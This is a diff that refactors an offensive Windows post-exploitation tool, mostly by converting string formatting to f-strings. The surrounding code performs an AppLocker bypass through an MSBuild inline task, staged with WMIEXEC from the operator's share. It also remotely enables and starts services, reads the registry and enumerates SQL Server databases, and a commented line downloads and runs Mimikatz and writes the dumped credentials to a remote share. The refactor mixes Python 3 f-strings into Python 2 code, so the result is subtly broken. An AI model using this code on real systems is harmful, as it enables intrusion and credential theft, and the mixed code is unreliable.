@@ -239,15 +239,13 @@ class RemoteOperationsReg:
         ans = scmr.hRQueryServiceStatus(self.__scmr,
                 self.__serviceHandle)
         if ans['lpServiceStatus']['dwCurrentState'] \
-            == scmr.SERVICE_STOPPED:
-            logging.info('Service %s is in stopped state'
-                         % self.__serviceName)
+                == scmr.SERVICE_STOPPED:
+            logging.info(f'Service {self.__serviceName} is in stopped state')
             self.__shouldStop = True
             self.__started = False
         elif ans['lpServiceStatus']['dwCurrentState'] \
-            == scmr.SERVICE_RUNNING:
-            logging.debug('Service %s is already running'
-                          % self.__serviceName)
+                == scmr.SERVICE_RUNNING:
+            logging.debug(f'Service {self.__serviceName} is already running')
             self.__shouldStop = False
             self.__started = True
         else:
@@ -257,12 +255,11 @@ class RemoteOperationsReg:
             ans = scmr.hRQueryServiceConfigW(self.__scmr,
                     self.__serviceHandle)
             if ans['lpServiceConfig']['dwStartType'] == 0x4:
-                logging.info('Service %s is disabled, enabling it'
-                             % self.__serviceName)
+                logging.info(f'Service {self.__serviceName} is disabled, enabling it')
                 self.__disabled = True
                 scmr.hRChangeServiceConfigW(self.__scmr,
                         self.__serviceHandle, dwStartType=0x3)
-            logging.info('Starting service %s' % self.__serviceName)
+            logging.info(f'Starting service {self.__serviceName}')
             scmr.hRStartServiceW(self.__scmr, self.__serviceHandle)
             time.sleep(1)
 
@@ -273,12 +270,11 @@ class RemoteOperationsReg:
 
     def __restore(self):
         if self.__shouldStop is True:
-            logging.info('Stopping service %s' % self.__serviceName)
+            logging.info(f'Stopping service {self.__serviceName}')
             scmr.hRControlService(self.__scmr, self.__serviceHandle,
                                   scmr.SERVICE_CONTROL_STOP)
         if self.__disabled is True:
-            logging.info('Restoring the disabled state for service %s'
-                         % self.__serviceName)
+            logging.info(f'Restoring the disabled state for service {self.__serviceName}')
             scmr.hRChangeServiceConfigW(self.__scmr,
                     self.__serviceHandle, dwStartType=0x4)
 
@@ -416,30 +412,30 @@ class RegHandler:
             rootKey = keyName.split('\\')[0]
             subKey = '\\'.join(keyName.split('\\')[1:])
         except Exception:
-            raise Exception('Error parsing keyName %s' % keyName)
+            raise Exception(f'Error parsing keyName {keyName}')
 
         if rootKey.upper() == 'HKLM':
             ans = rrp.hOpenLocalMachine(dce)
-        elif rootKey.upper() == 'HKU' or rootKey.upper() == 'HKCU':
+        elif rootKey.upper() in ['HKU', 'HKCU']:
             ans = rrp.hOpenCurrentUser(dce)
         elif rootKey.upper() == 'HKCR':
             ans = rrp.hOpenClassesRoot(dce)
         else:
-            raise Exception('Invalid root key %s ' % rootKey)
+            raise Exception(f'Invalid root key {rootKey} ')
 
         hRootKey = ans['phKey']
         ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey,
                                    samDesired=rrp.MAXIMUM_ALLOWED
                                    | rrp.KEY_ENUMERATE_SUB_KEYS
                                    | rrp.KEY_QUERY_VALUE)
-        if len(selectedKey) > 0:
-            value = rrp.hBaseRegQueryValue(dce, ans2['phkResult'],
-                    str(selectedKey))
-            return str(value[1])
-        else:
-            entriesList = self.__print_all_entries(dce, subKey + '\\',
-                    ans2['phkResult'], 0)
-            return entriesList
+        if len(selectedKey) <= 0:
+            return self.__print_all_entries(
+                dce, subKey + '\\', ans2['phkResult'], 0
+            )
+
+        value = rrp.hBaseRegQueryValue(dce, ans2['phkResult'],
+                str(selectedKey))
+        return str(value[1])
 
     def __print_key_values(self, rpc, keyHandler):
         i = 0
@@ -593,14 +589,11 @@ def getNetBiosName(ip):
 
 def cleanUp():
     import glob, os
-    for f in glob.glob(origScriptPath+"/modules/*.bat"):
+    for f in glob.glob(f"{origScriptPath}/modules/*.bat"):
         os.remove(f)    
 
 def encodeJavaScript(str1):
-    str2=''
-    for ch in str1:
-        str2+="\\x"+str([ch.encode("hex")][0])
-    return str2
+    return ''.join("\\x"+str([ch.encode("hex")][0]) for ch in str1)
 '''
 def appLockerBypass1(targetIP, domain, username, password, passwordHash,cmd):
     print (setColor("[*]", bold, color="blue"))+" "+targetIP+":445 "+(setColor("[applocker]  ", color="green"))+" | AppLocker Bypass Technique 1"    
@@ -642,8 +635,8 @@ def appLockerBypass1(targetIP, domain, username, password, passwordHash,cmd):
         if debugMode==True: 
             print results
 '''
-def appLockerBypass2(targetIP, domain, username, password, passwordHash,cmd):    
-    print (setColor("[*]", bold, color="blue"))+" "+targetIP+":445 | "+(setColor("[applocker]", color="green"))+" | AppLocker Bypass Technique 2"    
+def appLockerBypass2(targetIP, domain, username, password, passwordHash,cmd):
+    print (setColor("[*]", bold, color="blue"))+" "+targetIP+":445 | "+(setColor("[applocker]", color="green"))+" | AppLocker Bypass Technique 2"
     query= ('<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
     '  <Target Name="Hello">\n'
     '   <FragmentExample />\n'
@@ -736,10 +729,8 @@ def appLockerBypass2(targetIP, domain, username, password, passwordHash,cmd):
     '    </Task>\n'
     '  </UsingTask>\n'
     '</Project>\n')
-    f = open(origScriptPath+"/loot/"+'build.xml', 'w')
-    f.write(query)
-    f.close()
-
+    with open(f"{origScriptPath}/loot/build.xml", 'w') as f:
+        f.write(query)
     #cmd = 'powershell "IEX (New-Object Net.WebClient).DownloadString(\'http://'+targetIP+':8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds | Out-File \\\\'+myIP+'\\guest\\'+targetIP+'_mimikatz.txt"'
     #f = open(origScriptPath+"/loot/"+'callMimikatz.ps1', 'w')
     #f.write(cmd)
@@ -747,15 +738,15 @@ def appLockerBypass2(targetIP, domain, username, password, passwordHash,cmd):
 
     cmd = 'copy \\\\'+myIP+'\\guest\\build.xml C:\\windows\\temp /y'
     results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, cmd)    
-    
+
     #cmd = 'copy \\\\'+myIP+'\\guest\\callMimikatz.ps1 C:\\windows\\temp'
     #results=runWMIEXEC(targetIP, domain, username, password, passwordHash, cmd)    
     if getCPUType(targetIP,domain,username,password,passwordHash)==True:
         filename='C:\Windows\Microsoft.NET\Framework64\\v4.0.30319\msbuild.exe'
     else:
         filename='C:\Windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe'
-    cmd = 'dir '+filename   
-    results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, cmd) 
+    cmd = f'dir {filename}'
+    results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, cmd)
     if "The system cannot find the file specified" not in results:
         cmd = filename+" C:\\windows\\temp\\build.xml"
         return cmd
@@ -810,29 +801,23 @@ def listDatabases(db,conn):
     sql_query='USE master; SELECT NAME FROM sysdatabases;'
     results= conn.RunSQLQuery(db,sql_query,tuplemode=False,wait=True)
     dbList=[]
-    defaultDBList=[]
-    defaultDBList.append('master')
-    defaultDBList.append('tempdb')
-    defaultDBList.append('model')
-    defaultDBList.append('msdb')
+    defaultDBList = ['master', 'tempdb', 'model', 'msdb']
     for x in results:
-        for k, v in x.iteritems():
-            if v not in defaultDBList:  
-                dbList.append(v)
+        dbList.extend(v for k, v in x.iteritems() if v not in defaultDBList)
     return dbList
 
 def listTables(db,conn,dbName):
-    sql_query='SELECT * FROM '+dbName+'.INFORMATION_SCHEMA.TABLES;'
+    sql_query = f'SELECT * FROM {dbName}.INFORMATION_SCHEMA.TABLES;'
     results= conn.RunSQLQuery(db,sql_query,tuplemode=False,wait=True)
-    tableList=[]
-    for x in results:
-        if x.values()[3]=='BASE TABLE':
-            tableList.append([x.values()[0],x.values()[2]])
-    return tableList
+    return [
+        [x.values()[0], x.values()[2]]
+        for x in results
+        if x.values()[3] == 'BASE TABLE'
+    ]
     #print tabulate(tableList)
 
 def listColumns(db,conn,dbName,tableName):
-    sql_query='use '+dbName+';exec sp_columns '+tableName+';'
+    sql_query = f'use {dbName};exec sp_columns {tableName};'
     results= conn.RunSQLQuery(db,sql_query,tuplemode=False,wait=True)
     columnList=[]
     for x in results:
